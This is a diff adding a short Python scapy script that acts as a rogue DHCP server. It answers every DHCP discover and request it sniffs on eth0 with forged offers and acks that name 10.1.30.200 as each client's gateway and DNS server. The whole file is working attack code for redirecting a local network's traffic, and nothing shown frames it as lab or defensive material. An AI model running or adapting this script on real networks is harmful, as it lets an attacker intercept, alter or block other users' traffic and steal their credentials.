@@ -1,0 +1,40 @@
+from scapy.all import *
+
+def dhcp_reply(p):
+    if p.haslayer(DHCP):
+        msg_type = p[DHCP].options[0][1]
+
+        mac = p[Ether].src
+        xid = p[BOOTP].xid
+
+        if msg_type == 1:  
+            pkt = Ether(dst=mac)/ \
+                  IP(src="10.1.30.200", dst="255.255.255.255")/ \
+                  UDP(sport=67, dport=68)/ \
+                  BOOTP(op=2, yiaddr="10.1.30.250", siaddr="10.1.30.200", xid=xid)/ \
+                  DHCP(options=[
+                      ("message-type", "offer"),
+                      ("server_id", "10.1.30.200"),
+                      ("subnet_mask", "255.255.255.0"),
+                      ("router", "10.1.30.200"),
+                      ("name_server", "10.1.30.200"),
+                      "end"
+                  ])
+            sendp(pkt, iface="eth0", verbose=0)
+
+        elif msg_type == 3:  
+            pkt = Ether(dst=mac)/ \
+                  IP(src="10.1.30.200", dst="255.255.255.255")/ \
+                  UDP(sport=67, dport=68)/ \
+                  BOOTP(op=2, yiaddr="10.1.30.250", siaddr="10.1.30.200", xid=xid)/ \
+                  DHCP(options=[
+                      ("message-type", "ack"),
+                      ("server_id", "10.1.30.200"),
+                      ("subnet_mask", "255.255.255.0"),
+                      ("router", "10.1.30.200"),
+                      ("name_server", "10.1.30.200"),
+                      "end"
+                  ])
+            sendp(pkt, iface="eth0", verbose=0)
+
+sniff(filter="udp and (port 67 or port 68)", prn=dhcp_reply)
